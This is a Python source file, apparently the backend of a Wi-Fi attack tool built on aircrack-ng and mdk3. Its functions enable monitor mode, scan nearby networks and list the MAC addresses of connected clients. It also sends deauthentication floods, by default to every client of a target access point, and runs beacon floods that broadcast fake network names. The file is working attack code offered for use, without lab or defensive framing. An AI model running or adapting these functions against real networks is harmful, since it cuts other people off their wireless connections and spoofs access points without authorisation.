import os
import subprocess
import re
import csv
from collections import defaultdict
import time
import glob

def get_network_interfaces():
    try:
        output = subprocess.check_output(['iwconfig']).decode('utf-8')
        interfaces = re.findall(r'(\w+)\s+IEEE', output)
        return interfaces
    except (FileNotFoundError, subprocess.CalledProcessError):
        return []

def start_monitor_mode(interface, retries=3, wait=3):
    for attempt in range(retries):
        try:
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], check=True,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = result.stdout.decode('utf-8')

            match = re.search(r'(?:monitor mode|enabled).*?(\w+mon)\b', output, re.IGNORECASE)
            if match:
                monitor_interface = match.group(1)
                time.sleep(2)
                return monitor_interface, None
            else:
                print(f"[{attempt+1}/{retries}] Monitor interface not found. Retrying...")
                time.sleep(wait)
        except subprocess.CalledProcessError as e:
            print(f"[{attempt+1}/{retries}] Error: {e.stderr.decode('utf-8')}")
            time.sleep(wait)
        except FileNotFoundError:
            return None, "airmon-ng not found. Please install aircrack-ng suite."
        except Exception as e:
            print(f"[{attempt+1}/{retries}] Exception: {str(e)}")
            time.sleep(wait)
    return None, "Failed to start monitor mode after multiple attempts."

def stop_monitor_mode(monitor_interface):
    try:
        try:
            result = subprocess.run(
                ['sudo', 'airmon-ng', 'stop', monitor_interface],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10
            )
            if "removed" in result.stdout or "disabled" in result.stdout:
                return True, None
        except:
            pass
        
        try:
            base_interface = monitor_interface.replace('mon', '')
            commands = [
                ['sudo', 'iwconfig', monitor_interface, 'mode', 'managed'],
                ['sudo', 'ifconfig', monitor_interface, 'down'],
                ['sudo', 'ifconfig', base_interface, 'up']
            ]
            
            for cmd in commands:
                subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=True
                )
            return True, None
        except:
            pass
        
        result = subprocess.run(
            ['sudo', 'iwconfig', monitor_interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        if 'Mode:Monitor' not in result.stdout:
            return True, None
        else:
            return False, "Could not disable monitor mode"
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def run_airodump(monitor_interface, retries=3, wait=2):
    try:
        subprocess.run(['sudo', 'killall', 'airodump-ng'], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        
        for f in glob.glob('*-01.csv'):
            try:
                os.remove(f)
            except:
                pass

        scan_file = 'scan_results'
        cmd = [
            'sudo', 'airodump-ng',
            '--output-format', 'csv',
            '--write', scan_file,
            monitor_interface,
            '--band', 'bg'
        ]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        try:
            time.sleep(15)
            process.terminate()
            try:
                process.wait(2)
            except subprocess.TimeoutExpired:
                process.kill()
        except Exception as e:
            print(f"Scan process error: {str(e)}")
            process.kill()

        csv_file = f'{scan_file}-01.csv'
        if not os.path.exists(csv_file):
            return []

        networks = []
        clients = defaultdict(list)
        current_section = None

        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue

                row = [field.strip() for field in line.split(',')]
                
                if 'BSSID' in row[0] and 'Station MAC' not in row[0]:
                    current_section = 'networks'
                    continue
                elif 'Station MAC' in row[0]:
                    current_section = 'clients'
                    continue
                
                if current_section == 'networks' and len(row) >= 14:
                    network = {
                        'bssid': row[0],
                        'power': row[3],
                        'beacons': row[4],
                        'channel': row[5],
                        'encryption': row[6],
                        'essid': row[13] if len(row) > 13 else '',
                        'clients': []
                    }
                    networks.append(network)
                elif current_section == 'clients' and len(row) >= 6:
                    bssid = row[5].strip()
                    if bssid and bssid != '(not associated)':
                        clients[bssid].append(row[0].strip())

        for network in networks:
            if network['bssid'] in clients:
                network['clients'] = clients[network['bssid']]

        try:
            os.remove(csv_file)
        except:
            pass

        return networks

    except Exception as e:
        print(f"Error in run_airodump: {str(e)}")
        return []

def run_deauth(monitor_interface, target_bssid, target_mac='ff:ff:ff:ff:ff:ff', num_packets='100', channel=None):
    try:
        subprocess.run(['sudo', 'pkill', '-f', 'aireplay-ng'], 
                      stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        
        if not channel:
            try:
                airodump = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', target_bssid, 
                                           '--channel', '1-14', '--write', 'temp_channel', 
                                           monitor_interface],
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                airodump.terminate()
                
                if os.path.exists('temp_channel-01.csv'):
                    with open('temp_channel-01.csv', 'r') as f:
                        for line in f:
                            if target_bssid.lower() in line.lower():
                                parts = line.split(',')
                                if len(parts) > 5:
                                    channel = parts[5].strip()
                                    break
            except:
                pass
        
        if channel and channel.isdigit():
            subprocess.run(['sudo', 'iwconfig', monitor_interface, 'channel', channel],
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(1)
        
        cmd = [
            'sudo', 'aireplay-ng',
            '--deauth', str(num_packets),
            '-a', target_bssid,
            '-c', target_mac,
            monitor_interface
        ]
        
        process = subprocess.Popen(cmd,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 universal_newlines=True)
        
        try:
            if int(num_packets) > 0:
                stdout, stderr = process.communicate()
            else:
                stdout, stderr = process.communicate(timeout=15)
            
            if process.returncode == 0:
                return True, f"Successfully sent {num_packets} deauth packets to {target_bssid} on channel {channel or 'unknown'}"
            
            error_msg = stderr.strip() or stdout.strip() or "Unknown error occurred"
            return False, f"Deauth failed: {error_msg}"
            
        except subprocess.TimeoutExpired:
            process.kill()
            return True, f"Deauth attack timed out and was stopped after 15 seconds against {target_bssid} on channel {channel or 'unknown'}"
            
    except Exception as e:
        return False, f"Deauth failed: {str(e)}"
    finally:
        for f in glob.glob('temp_channel*'):
            try:
                os.remove(f)
            except:
                pass

def create_fake_ap_list(filename, ap_names):
    try:
        if not ap_names or not isinstance(ap_names, list):
            return False, "AP names list is empty or invalid"
        
        with open(filename, 'w') as f:
            for name in ap_names:
                if name.strip():
                    f.write(name.strip() + '\n')
        return True, None
    except Exception as e:
        return False, f"Failed to create AP list: {str(e)}"

def start_fake_ap(monitor_interface, ap_list_file, channel=1):
    try:
        stop_fake_ap()
        
        cmd = [
            'sudo', 'mdk3', monitor_interface, 'b',
            '-c', str(channel),
            '-f', ap_list_file
        ]
        
        process = subprocess.Popen(cmd,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 text=True)
        return process, None
    except Exception as e:
        return None, str(e)

def stop_fake_ap():
    try:
        subprocess.run(['sudo', 'pkill', '-f', 'mdk3'], 
                      stdout=subprocess.PIPE, 
                      stderr=subprocess.PIPE)
        return True, None
    except Exception as e:
        return False, str(e)

def get_running_fake_aps():
    try:
        result = subprocess.run(['sudo', 'pgrep', '-a', 'mdk3'],
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              text=True)
        if result.returncode == 0:
            return result.stdout.strip().split('\n')
        return []
    except Exception as e:
        return []

def run_fake_ap(monitor_interface, ap_list_file):
    process, error = start_fake_ap(monitor_interface, ap_list_file)
    if error:
        return False, error
    return True, None
